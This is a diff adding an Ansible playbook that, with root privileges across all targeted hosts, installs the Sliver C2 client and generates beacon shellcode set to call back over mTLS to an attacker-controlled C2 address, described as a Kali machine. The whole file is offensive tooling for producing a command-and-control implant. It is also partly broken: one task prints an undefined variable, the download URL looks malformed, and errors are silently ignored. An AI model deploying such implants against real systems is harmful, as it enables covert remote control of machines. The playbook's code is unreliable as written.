@@ -1,0 +1,61 @@
+---
+- name: Install and generate a Sliver beacon
+  hosts: all
+  become: true
+  vars:
+    sliver_server_ip: ""  # Replace with your Kali machine's IP
+    sliver_server_port: 8888  # Default Sliver C2 server port
+    beacon_name: "NIKES_ON_MY_FEET_MAKE_THE_CIPHER_COMPLETE"
+    c2_address: ""  # Replace with your Kali machine's IP
+    c2_port: 443  # Port where the beacon communicates with the C2
+  tasks:
+    - name: Update the package cache
+      ansible.builtin.yum:
+        name: "*"
+        state: latest
+        update_cache: yes
+
+    - name: Install prerequisites for Sliver
+      ansible.builtin.yum:
+        name:
+          - wget
+          - curl
+          - unzip
+          - git
+          - gcc
+          - make
+          - golang
+        state: present
+
+    - name: Download Sliver client binary
+      ansible.builtin.get_url:
+        url: "https://github.com/BishopFox/sliver/releases/download/latest/sliver-client_linux"
+        dest: /usr/local/bin/sliver-client
+        mode: "0755"
+
+    - name: Verify Sliver client installation
+      ansible.builtin.shell:
+        cmd: "sliver-client --help"
+      register: sliver_check
+      ignore_errors: yes
+
+    - name: Print Sliver client installation status
+      ansible.builtin.debug:
+        msg: "Sliver client version: {{ sliver_client_version.stdout }}"
+
+    - name: Generate a Sliver beacon
+      ansible.builtin.shell:
+        cmd: |
+          sliver-client --connect {{ sliver_server_ip }}:{{ sliver_server_port }} --skip-update <<EOF
+          use beacon
+          generate beacon --mtls {{ c2_address }}:{{ c2_port }} --arch amd64 --format shellcode --name {{ beacon_name }}
+          exit
+          EOF
+        chdir: /tmp
+      register: sliver_beacon
+      ignore_errors: yes
+
+    - name: Print beacon generation output
+      ansible.builtin.debug:
+        msg: "{{ sliver_beacon.stdout }}"
+
